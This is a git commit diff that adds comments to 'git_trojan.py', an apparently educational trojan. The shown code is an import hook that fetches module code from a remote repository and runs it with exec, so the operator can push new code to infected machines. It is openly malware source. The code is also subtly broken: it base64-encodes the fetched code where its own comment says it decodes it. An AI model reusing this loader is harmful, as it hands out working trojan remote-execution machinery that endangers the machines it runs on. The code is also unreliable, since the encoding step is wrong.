45b7b8b85634795e72e1d466fabe21a628b5c394
milezperhour <hyperbolvoid@gmail.com>
2018-08-05 20:52:59 -0700

    added more commentary

--- chapter7/trojan/git_trojan.py
+++ chapter7/trojan/git_trojan.py
@@ -74,21 +74,29 @@ class GitImporter(object):
     def __init__(self):
         self.current_module_code = ''
 
+    # attempts to locate the module
     def find_module(self, fullname, path = None):
         if configured:
             print '[*] Attempting to retrieve %s' % fullname
+            # pass the call to this remote file
             new_library = get_file_contents('modules/%s' % fullname)
 
+            # if file is located in repo; base64-decode the code and store it in the class
             if new_library is not None:
                 self.current_module_code = base64.b64encode(new_library)
+                # returning self indicates to the Python interpreter that module was found
                 return self
 
         return None
 
 
     def load_module(self, name):
+        # create new blank module object
         module = imp.new_module(name)
+        # then shovel the code retrieved from Github to it
         exec self.current_module_code in module.__dict__
+        # insert newly created module into the sys.modules list
+        # so that it's picked up by any future calls
         sys.modules[name] = module
 
         return module
